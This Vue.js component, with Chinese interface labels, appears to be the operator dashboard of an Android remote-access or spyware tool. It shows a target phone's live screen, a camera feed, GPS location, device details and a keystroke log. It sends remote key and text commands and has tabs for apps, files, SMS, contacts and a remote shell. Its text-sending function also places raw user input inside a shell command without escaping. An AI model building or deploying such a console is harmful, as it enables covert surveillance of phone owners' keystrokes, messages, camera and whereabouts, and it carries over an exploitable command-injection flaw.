<template>
  <div class="monitor-container">
    <!-- 中央监视区 -->
    <div class="main-monitor">
      <!-- 屏幕串流画面 -->
      <div class="screen-stream">
        <img :src="screenStreamUrl" alt="屏幕串流" class="stream-image" />
        
        <!-- 摄像头小窗 -->
        <div class="camera-window">
          <img :src="cameraStreamUrl" alt="摄像头" class="camera-image" />
        </div>
        
        <!-- 定位浮层 -->
        <div class="location-overlay" v-if="locationData">
          <v-icon color="red" size="24">location_on</v-icon>
          <div class="location-info">
            <div>{{ locationData.address }}</div>
            <div class="coordinates">{{ locationData.lat }}, {{ locationData.lng }}</div>
          </div>
        </div>
      </div>
      
      <!-- 右侧面板 -->
      <div class="right-panel">
        <!-- 设备信息 -->
        <div class="panel-section">
          <h3>设备信息</h3>
          <div class="device-info">
            <div class="info-item">
              <span class="label">型号:</span>
              <span class="value">{{ deviceInfo.model }}</span>
            </div>
            <div class="info-item">
              <span class="label">系统:</span>
              <span class="value">{{ deviceInfo.androidVersion }}</span>
            </div>
            <div class="info-item">
              <span class="label">电量:</span>
              <span class="value">{{ deviceInfo.battery }}%</span>
            </div>
            <div class="info-item">
              <span class="label">网络:</span>
              <span class="value">{{ deviceInfo.network }}</span>
            </div>
          </div>
        </div>
        
        <!-- 按键记录日志 -->
        <div class="panel-section">
          <h3>按键记录</h3>
          <div class="key-logs">
            <div v-for="(log, index) in keyLogs" :key="index" class="log-item">
              <span class="log-time">{{ log.time }}</span>
              <span class="log-key">{{ log.key }}</span>
            </div>
          </div>
        </div>
        
        <!-- 导航按钮 -->
        <div class="panel-section">
          <h3>导航控制</h3>
          <div class="nav-buttons">
            <v-btn class="nav-btn" @click="sendNavCommand('home')">主页</v-btn>
            <v-btn class="nav-btn" @click="sendNavCommand('back')">返回</v-btn>
            <v-btn class="nav-btn" @click="sendNavCommand('recent')">任务</v-btn>
            <v-btn class="nav-btn" @click="sendNavCommand('notification')">通知</v-btn>
          </div>
          <v-text-field
            v-model="textInput"
            label="文字输入"
            class="text-input"
            @keyup.enter="sendText"
          />
        </div>
      </div>
    </div>
    
    <!-- 底部标签栏 -->
    <div class="bottom-tabs">
      <v-tabs v-model="activeTab" background-color="primary" dark>
        <v-tab href="#tab-apps">应用</v-tab>
        <v-tab href="#tab-files">文件</v-tab>
        <v-tab href="#tab-sms">短信</v-tab>
        <v-tab href="#tab-contacts">通讯录</v-tab>
        <v-tab href="#tab-shell">Shell</v-tab>
        <v-tab href="#tab-location">位置</v-tab>
      </v-tabs>
      
      <v-tabs-items v-model="activeTab">
        <v-tab-item value="tab-apps">
          <AppsPanel />
        </v-tab-item>
        <v-tab-item value="tab-files">
          <FilesPanel />
        </v-tab-item>
        <v-tab-item value="tab-sms">
          <SmsPanel />
        </v-tab-item>
        <v-tab-item value="tab-contacts">
          <ContactsPanel />
        </v-tab-item>
        <v-tab-item value="tab-shell">
          <ShellPanel />
        </v-tab-item>
        <v-tab-item value="tab-location">
          <LocationPanel />
        </v-tab-item>
      </v-tabs-items>
    </div>
  </div>
</template>

<script>
import { getDeviceScreen, getDeviceCamera, getDeviceLocation, sendCommand } from '@/api/device'
import AppsPanel from './components/AppsPanel.vue'
import FilesPanel from './components/FilesPanel.vue'
import SmsPanel from './components/SmsPanel.vue'
import ContactsPanel from './components/ContactsPanel.vue'
import ShellPanel from './components/ShellPanel.vue'
import LocationPanel from './components/LocationPanel.vue'

export default {
  name: 'Monitor',
  components: {
    AppsPanel,
    FilesPanel,
    SmsPanel,
    ContactsPanel,
    ShellPanel,
    LocationPanel,
  },
  data: () => ({
    activeTab: 'tab-apps',
    screenStreamUrl: '',
    cameraStreamUrl: '',
    locationData: null,
    deviceInfo: {
      model: 'Samsung Galaxy S24',
      androidVersion: '14',
      battery: 85,
      network: 'WiFi',
    },
    keyLogs: [
      { time: '12:00:00', key: 'HOME' },
      { time: '12:00:05', key: 'BACK' },
      { time: '12:00:10', key: 'VOLUME_UP' },
    ],
    textInput: '',
  }),
  mounted() {
    this.loadScreenStream()
    this.loadCameraStream()
    this.loadLocation()
  },
  methods: {
    async loadScreenStream() {
      try {
        const { data } = await getDeviceScreen('DEVICE001')
        this.screenStreamUrl = data.url
      } catch (e) {
        console.error('加载屏幕串流失败', e)
      }
    },
    async loadCameraStream() {
      try {
        const { data } = await getDeviceCamera('DEVICE001')
        this.cameraStreamUrl = data.url
      } catch (e) {
        console.error('加载摄像头失败', e)
      }
    },
    async loadLocation() {
      try {
        const { data } = await getDeviceLocation('DEVICE001')
        this.locationData = data
      } catch (e) {
        console.error('加载定位失败', e)
      }
    },
    async sendNavCommand(command) {
      try {
        await sendCommand('DEVICE001', `input keyevent ${this.getKeyCode(command)}`)
      } catch (e) {
        console.error('发送导航命令失败', e)
      }
    },
    async sendText() {
      try {
        await sendCommand('DEVICE001', `input text "${this.textInput}"`)
        this.textInput = ''
      } catch (e) {
        console.error('发送文本失败', e)
      }
    },
    getKeyCode(command) {
      const keyMap = {
        home: 'KEYCODE_HOME',
        back: 'KEYCODE_BACK',
        recent: 'KEYCODE_APP_SWITCH',
        notification: 'KEYCODE_NOTIFICATION',
      }
      return keyMap[command] || command
    },
  },
}
</script>

<style lang="scss" scoped>
.monitor-container {
  display: flex;
  flex-direction: column;
  height: 100vh;
}

.main-monitor {
  display: flex;
  flex: 1;
  overflow: hidden;
}

.screen-stream {
  flex: 1;
  position: relative;
  background: #000;
  
  .stream-image {
    width: 100%;
    height: 100%;
    object-fit: contain;
  }
  
  .camera-window {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 200px;
    height: 150px;
    background: #333;
    border: 2px solid #fff;
    border-radius: 8px;
    overflow: hidden;
    
    .camera-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  }
  
  .location-overlay {
    position: absolute;
    bottom: 20px;
    left: 20px;
    background: rgba(0, 0, 0, 0.7);
    padding: 10px 15px;
    border-radius: 8px;
    color: white;
    display: flex;
    align-items: center;
    gap: 10px;
    
    .location-info {
      .coordinates {
        font-size: 12px;
        opacity: 0.8;
      }
    }
  }
}

.right-panel {
  width: 300px;
  background: #f5f5f5;
  border-left: 1px solid #ddd;
  overflow-y: auto;
  padding: 15px;
  
  .panel-section {
    margin-bottom: 20px;
    
    h3 {
      font-size: 16px;
      margin-bottom: 10px;
      color: #333;
    }
  }
  
  .device-info {
    .info-item {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #eee;
      
      .label {
        color: #666;
      }
      
      .value {
        font-weight: 500;
      }
    }
  }
  
  .key-logs {
    max-height: 150px;
    overflow-y: auto;
    
    .log-item {
      display: flex;
      justify-content: space-between;
      padding: 5px 0;
      font-size: 12px;
      
      .log-time {
        color: #999;
      }
      
      .log-key {
        color: #333;
        font-weight: 500;
      }
    }
  }
  
  .nav-buttons {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px;
    margin-bottom: 15px;
    
    .nav-btn {
      font-size: 12px;
    }
  }
  
  .text-input {
    margin-top: 10px;
  }
}

.bottom-tabs {
  height: 400px;
  border-top: 1px solid #ddd;
}
</style>
